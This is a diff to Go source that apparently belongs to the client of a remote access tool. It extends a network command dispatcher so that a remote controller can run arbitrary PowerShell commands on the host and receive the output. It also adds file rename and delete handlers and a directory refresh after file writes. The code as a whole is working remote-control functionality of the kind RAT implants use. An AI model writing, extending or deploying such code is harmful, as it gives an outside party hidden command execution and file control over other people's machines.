@@ -76,6 +76,31 @@ func Read(Data []byte, Connection net.Conn) {
 			}
 			SessionLog(utf8Stdout, Connection, *unmsgpack)
 		}()
+	case "OSpowershell":
+		{
+			go func() {
+				powershell := exec.Command("powershell", "-Command", unmsgpack.ForcePathObject("Command").GetAsString())
+
+				var stdout, stderr bytes.Buffer
+				powershell.Stdout = &stdout
+				powershell.Stderr = &stderr
+
+				err := powershell.Run()
+				result := stdout.String()
+				if err != nil {
+					if result == "" {
+						result = stderr.String()
+					}
+				}
+				utf8Stdout, err := Helper.ConvertGBKToUTF8(result)
+				if err != nil {
+					utf8Stdout = err.Error()
+				}
+
+				// 记录执行结果
+				SessionLog(utf8Stdout, Connection, *unmsgpack)
+			}()
+		}
 
 	case "getDrivers":
 		{
@@ -150,6 +175,10 @@ func Read(Data []byte, Connection net.Conn) {
 
 			RefreshDir(Connection, *unmsgpack)
 		}
+	case "renameFile":
+		{
+			RenameFile(unmsgpack.ForcePathObject("OldName").GetAsString(), unmsgpack.ForcePathObject("NewName").GetAsString())
+		}
 
 	case "execute":
 		{ //Args := unmsgpack.ForcePathObject("Args").GetAsString()
@@ -184,6 +213,9 @@ func Read(Data []byte, Connection net.Conn) {
 		}
 
 	case "deleteFile":
+		{
+			DeleteFile(Connection, *unmsgpack)
+		}
 
 	case "cutFile":
 		{
@@ -208,6 +240,7 @@ func Read(Data []byte, Connection net.Conn) {
 			if err != nil {
 				SessionLog("File writing failed! , please elevate privileges", Connection, *unmsgpack)
 			}
+			RefreshDir(Connection, *unmsgpack)
 		}
 
 	case "downloadFile":
